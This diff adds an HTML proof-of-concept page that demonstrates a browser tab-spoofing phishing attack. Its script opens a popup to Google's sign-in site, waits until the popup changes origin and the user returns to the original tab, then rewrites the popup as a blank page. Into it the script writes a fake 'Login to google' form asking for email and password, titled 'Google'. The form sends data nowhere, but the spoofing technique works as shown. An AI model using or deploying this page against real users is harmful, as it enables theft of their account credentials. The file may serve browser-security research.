@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>POC</title>
+    <style>
+        body,
+        html {
+            margin: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #f0f0f0;
+            font-family: Arial, sans-serif
+        }
+
+        #myButton {
+            padding: 1rem 2rem;
+            font-size: 1rem;
+            border: none;
+            border-radius: 0.5rem;
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.1s ease, box-shadow 0.1s ease
+        }
+
+        #myButton:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1)
+        }
+    </style>
+</head>
+
+<body>
+
+    <button id="myButton" onclick="handleClick();">Click me!</button>
+
+    <script>
+        const handleClick = () => {
+
+            // 2. Open a new window with REAL Bing (instead of about:blank)
+            const x = window.open('https://accounts.google.com', 'x');
+
+            // 3. Change the current page to prompt the user to switch tabs
+            document.body.innerHTML = '<h1>Go back to the other tab</h1>';
+
+            // 4. Monitor the popup – when it navigates to a different origin,
+            //    we lose access and set up a focus handler to spoof it.
+            const interval = setInterval(() => {
+                try {
+                    const href = x.location.href; // will throw if cross-origin
+                    if (href !== 'about:blank') {
+                        console.log('Still same-origin:', href);
+                    }
+                } catch (e) {
+                    // Popup is now on a different origin (the user navigated away from Bing)
+                    console.log('Navigated to a different origin, lost access.');
+
+                    // When the user comes back to this page (original tab),
+                    // redirect the popup back to about:blank and write spoofed content.
+                    window.onfocus = () => {
+                        x.location = 'about:blank'; // force it back to blank
+
+                        setTimeout(() => {
+                            x.document.write(
+                                '<h1>Login to google</h1><h2>Sign in</h2><form id="loginForm"><label for="email">Email   </label><input type="email" id="email" placeholder="your@email.com" required /><br><label for="pwd">Password   </label><input type="password" d="pwd" placeholder="••••••••" required /> <br>    <button type="submit">Sign in<button></form>'
+                            );
+                            x.document.title = 'Google';
+                        }, 100);
+                    };
+                    clearInterval(interval);
+                }
+            }, 500);
+        };
+    </script>
+
+</body>
+
+</html>
